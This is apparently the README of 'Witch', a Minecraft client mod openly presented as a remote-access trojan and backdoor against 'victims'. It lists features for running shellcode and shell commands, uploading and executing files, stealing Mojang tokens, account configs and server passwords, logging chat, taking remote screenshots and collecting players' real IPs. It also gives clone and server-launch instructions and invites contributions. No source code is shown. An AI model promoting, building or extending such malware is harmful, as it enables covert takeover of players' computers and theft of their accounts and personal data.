<div align="center">
    <h1>Witch</h1><br>
    <img src="./icon.png" title="Witch">  
</div>

New generation Minecraft RAT / Backdoor Mod.

The Witch system controls Minecraft clients and grant full access to your victim's PC.

**Forge will never be supported.**

**I will not backport it to older versions.**

**I will not make a server backdoor mod for fabric.**

## Features

### Client

- Obfuscate
- Custom server name (for client display)
- [ ] Encrypted Socket
- [ ] Infect other mods
- [ ] Command system enhancement

### Server

- [ ] Help command
- [ ] Better logging
- [ ] Web UI

### System administration

- System information
- Execute shellcode (for Windows, 32 bit)
- [ ] Remote shell
- Shell commands
- File upload & execute (for Windows)
- Read text files
- Get run arguments

### Social engineering

- [IAS](https://modrinth.com/mod/in-game-account-switcher) mod config steal
- Grab offline server passwords
- Grab Mojang user tokens
- Log chat & commands

### Player information

- Remote screenshot
- Mod list
- Player info like coordinates, real ip, etc.
- Player skin download

### Player controlling

- [ ] Mind control
- [ ] /op @a
- [ ] I am a hacker (Send message without being known by the victim)
- [ ] Invisible player (Make the victim unable to see you)
- Chat system (With your victim in game)
- [ ] Out-of-game chat system
- Chat control
- Filter & mute chat
- Kick people from server and prevent them from joining server

### Running

1. Run `git clone https://github.com/ThebestkillerTBK/witch.git`
2. Open in your favorite IDE

### Using

* [ ] Client: Build system working
* Server: `java -jar server.jar <port> <name>`
* Default port and name: `11451` and `Witch`

#### Files:

* Data root folder is `data`
* screenshots - Client screenshot
* logging - Player chat & command logs
* skins - Player skins
* data - Stolen token, config, etc.

### Contributing to the project

* Create PRs to make this mod better!
* Leave a star if you like it!